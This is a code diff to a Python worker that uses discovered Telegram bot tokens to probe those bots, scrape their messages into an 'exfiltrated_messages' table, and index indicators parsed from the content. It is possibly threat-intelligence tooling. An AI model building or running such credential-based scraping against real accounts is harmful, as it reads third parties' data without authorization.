@@ -1,6 +1,8 @@
 import asyncio
 import os
 import time
+from collections import defaultdict
+from typing import Any, Dict, List
 
 import httpx
 from app.workers.celery_app import app
@@ -18,6 +20,102 @@ logger = logging.getLogger("flow.tasks")
 async def async_execute(query_builder):
     """Executes a Supabase query builder synchronously in a background thread."""
     return await asyncio.to_thread(query_builder.execute)
+
+
+async def _hydrate_message_rows_for_index(message_rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+    """Ensure rows have the exfiltrated_messages UUID needed by telemetry_indicators."""
+    hydrated: List[Dict[str, Any]] = []
+    missing_by_credential: Dict[str, List[int]] = defaultdict(list)
+    source_by_key: Dict[tuple[str, int], Dict[str, Any]] = {}
+
+    for row in message_rows:
+        credential_id = row.get("credential_id")
+        telegram_msg_id = row.get("telegram_msg_id")
+        if row.get("id") and credential_id:
+            hydrated.append(row)
+            continue
+        if credential_id and telegram_msg_id is not None:
+            try:
+                telegram_id_int = int(telegram_msg_id)
+            except (TypeError, ValueError):
+                continue
+            key = (str(credential_id), telegram_id_int)
+            source_by_key[key] = row
+            missing_by_credential[str(credential_id)].append(telegram_id_int)
+
+    for credential_id, telegram_ids in missing_by_credential.items():
+        unique_ids = sorted(set(telegram_ids))
+        for start in range(0, len(unique_ids), 100):
+            chunk = unique_ids[start:start + 100]
+            response = await async_execute(
+                db.table("exfiltrated_messages")
+                .select("id, credential_id, telegram_msg_id, content, media_type, file_meta")
+                .eq("credential_id", credential_id)
+                .in_("telegram_msg_id", chunk)
+            )
+            for db_row in response.data or []:
+                try:
+                    key = (str(db_row.get("credential_id")), int(db_row.get("telegram_msg_id")))
+                except (TypeError, ValueError):
+                    continue
+                source_row = source_by_key.get(key, {})
+                merged = dict(source_row)
+                merged.update(db_row)
+                hydrated.append(merged)
+
+    return hydrated
+
+
+async def _index_telemetry_indicators(message_rows: List[Dict[str, Any]]) -> int:
+    """Best-effort structured indicator indexing for newly inserted messages."""
+    if not message_rows:
+        return 0
+
+    try:
+        from app.services.telemetry_parser import TelemetryEntityParser
+
+        message_rows = await _hydrate_message_rows_for_index(message_rows)
+        indicator_rows: List[Dict[str, Any]] = []
+        for row in message_rows:
+            message_id = row.get("id")
+            credential_id = row.get("credential_id")
+            if not message_id or not credential_id:
+                continue
+
+            raw_payload = row.get("raw_payload")
+            if not isinstance(raw_payload, dict):
+                raw_payload = row.get("file_meta") if isinstance(row.get("file_meta"), dict) else {}
+
+            indicators = TelemetryEntityParser.parse_payload(row.get("content") or "", raw_payload)
+            for indicator in indicators:
+                indicator_rows.append({
+                    "credential_id": credential_id,
+                    "message_id": message_id,
+                    "indicator_type": indicator["type"],
+                    "indicator_value": indicator["value"],
+                    "raw_context": {
+                        "telegram_msg_id": row.get("telegram_msg_id"),
+                        "media_type": row.get("media_type"),
+                    },
+                })
+
+        if not indicator_rows:
+            return 0
+
+        result = await asyncio.wait_for(
+            async_execute(
+                db.table("telemetry_indicators").upsert(
+                    indicator_rows,
+                    on_conflict="message_id,indicator_type,indicator_value",
+                    ignore_duplicates=True,
+                )
+            ),
+            timeout=10.0,
+        )
+        return len(result.data or [])
+    except Exception as e:
+        logger.debug(f"[TelemetryParser] Indicator indexing skipped: {e}")
+        return 0
 
 
 # Redis Client for Locking
@@ -132,6 +230,7 @@ async def _exfiltrate_logic(cred_id: str):
 
     # HTTP Preflight Check — verify token before heavy scrape
     try:
+        await scraper_service._probe_gateway_telemetry(encrypted_token, cred_id)
         updates, meta_info, is_revoked = await scraper_service._http_preflight_check(bot_token)
         if is_revoked:
             await async_execute(
@@ -139,7 +238,10 @@ async def _exfiltrate_logic(cred_id: str):
             )
             return "Record inactive; marked revoked during preflight."
         if meta_info.get("webhook_url"):
-            merged_meta = dict(current_meta)
+            latest_meta_res = await async_execute(
+                db.table("discovered_credentials").select("meta").eq("id", cred_id).single()
+            )
+            merged_meta = dict((latest_meta_res.data or {}).get("meta") or current_meta)
             merged_meta["webhook_url"] = meta_info["webhook_url"]
             await async_execute(
                 db.table("discovered_credentials").update({"meta": merged_meta}).eq("id", cred_id)
@@ -147,13 +249,14 @@ async def _exfiltrate_logic(cred_id: str):
         if updates:
             for u in updates:
                 u["credential_id"] = cred_id
-            await async_execute(
+            preflight_result = await async_execute(
                 db.table("exfiltrated_messages").upsert(
                     updates,
                     on_conflict="credential_id,telegram_msg_id",
                     ignore_duplicates=True
                 )
             )
+            await _index_telemetry_indicators(preflight_result.data or updates)
     except Exception as e:
         logger.warning(f"⚠️ [Exfil] Preflight check failed for {cred_id}: {e}")
 
@@ -188,6 +291,7 @@ async def _exfiltrate_logic(cred_id: str):
 
     # Save Messages (using UPSERT to prevent duplicates)
     new_count = 0
+    index_candidates: List[Dict[str, Any]] = []
     for msg in messages:
         msg["credential_id"] = cred_id
         
@@ -207,8 +311,14 @@ async def _exfiltrate_logic(cred_id: str):
             
             if result.data:
                 new_count += 1
+                index_candidates.extend(result.data)
+            else:
+                index_candidates.append(db_payload)
         except Exception as e:
             logger.error(f"    ❌ Insert error for msg {msg.get('telegram_msg_id')}: {e}")
+
+    if index_candidates:
+        await _index_telemetry_indicators(index_candidates)
 
     if new_count > 0:
         await broadcaster.send_log(f"💾 Saved {new_count} new messages to DB.")
